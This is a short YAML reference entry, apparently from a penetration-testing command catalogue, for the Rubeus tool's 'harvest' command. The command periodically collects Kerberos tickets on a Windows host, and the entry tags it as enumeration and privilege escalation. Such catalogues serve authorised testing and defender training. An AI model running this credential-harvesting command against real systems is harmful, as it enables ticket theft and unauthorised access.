---
description: |
  Harvest tickets from Kerberos

  Command Reference:


command: |
  Rubeus.exe harvest /interval:30
items:
  - Shell
target: |
  - Windows_target
OS:
  - Windows
environment: |
  - Local
  - Network
command_types:
  - Host_Enumeration
  - Privilege_Escalation
services:
  - Kerberos
references:
  - https://github.com/GhostPack/Rubeus
---
